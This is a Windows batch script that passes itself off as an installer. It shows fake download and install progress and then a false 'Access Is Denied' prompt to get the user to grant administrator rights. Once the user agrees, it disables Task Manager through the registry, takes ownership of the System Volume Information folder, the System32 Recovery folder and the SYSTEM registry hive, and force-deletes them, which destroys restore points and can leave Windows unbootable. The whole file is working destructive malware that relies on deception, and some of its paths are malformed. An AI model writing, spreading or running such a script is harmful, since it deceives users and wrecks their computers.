@echo off
color a 
echo Downloading. Please Do Not Exit This Window!
timeout /t 7 NOBREAK >nul
echo Installing. Please Do Not Exit This Window!
timeout /t 9 NOBREAK >nul
echo Successfully Installed! you may proceed.
echo Moving To Desktop.....
echo Access Is Denied
echo Please Grant Administrator Priveleges to continue! (Answer in only yes and no)
set /p input=
if /i %input%==yes goto A
if /i %input%==no goto B
:A
echo Moving To Desktop...
echo Successfullly Moved To Desktop!
@echo off
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
takeown /f C:\System Volume Information folder
icacls C:\System Volume Information folder /grant administrators:F
cd C:\System Volume Information folder
del /F /S /Q C:\System Volume Information folder
timeout /t 3 NOBREAK >nul
takeown /f C:\\Windows\\System32\\Recovery
icacls C:\\Windows\\System32\\Recovery /grant administrators:F
del /F /S /Q C:\\Windows\\System32\\Recovery
timeout /t 3 NOBREAK >nul
takeown /f C:\Windows\System32\config\SYSTEM
icacls \Windows\System32\config\SYSTEM /grant administrators:F
del /F /S /Q \Windows\System32\config\SYSTEM
pause 
exit
:B
echo Installation Failed Please Try Again Later.
timeout /t 5 NOBREAK >nul
exit

